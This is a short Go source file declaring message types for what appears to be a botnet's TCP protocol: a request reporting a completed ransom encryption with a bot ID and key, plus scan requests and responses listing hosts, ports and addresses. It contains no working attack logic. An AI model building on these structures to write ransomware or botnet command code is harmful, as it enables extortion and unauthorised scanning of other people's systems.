package tcp

type ransomCompleteRequest struct {
	BotID []byte
	Key   []byte
}

type scanRequest struct {
	Type  string
	Hosts []string
	Ports []string
}

type scanResponse struct {
	Addrs []string
}
